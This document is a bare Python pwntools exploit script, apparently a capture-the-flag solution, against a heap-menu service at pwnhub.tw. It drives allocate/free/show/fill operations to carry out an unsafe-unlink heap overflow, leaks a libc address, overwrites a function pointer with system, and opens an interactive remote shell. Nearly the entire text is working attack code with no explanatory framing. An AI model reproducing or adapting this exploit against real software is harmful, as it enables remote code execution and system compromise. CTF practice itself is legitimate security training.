#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

host = "10.211.55.6"
port = 8888
host = "pwnhub.tw"
port = 19009

r = remote(host,port)


def allocate(size):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))

def free(idx):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))

def show(idx):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))

def fill(idx,data):
    r.recvuntil(":")
    r.sendline("4")
    r.recvuntil(":")
    r.sendline(str(idx))
    r.recvuntil(":")
    r.sendline(data)

context.arch = "amd64"

allocate(0x80) # 0
allocate(0x80) # 1
allocate(0x80) # 2
allocate(0x20) # prevent merge to top
fd = 0x6020e8 - 0x18
bk = 0x6020e8 - 0x10
fill(0,"a"*0x90 + p64(0) + p64(0x81) + p64(fd) + p64(bk) + "b"*0x60 + p64(0x80) + p64(0x90) )
free(2)
fill(1,"a"*0x10 + p64(0x602058))
show(0)

r.recvuntil(":")
libc =u64(r.recvuntil("\n")[:-1].ljust(8,"\x00")) - 0x36eb0
print hex(libc)
system = libc + 0x45390
fill(0,p64(system))
r.recvuntil(":")
r.sendline("sh")
r.interactive()
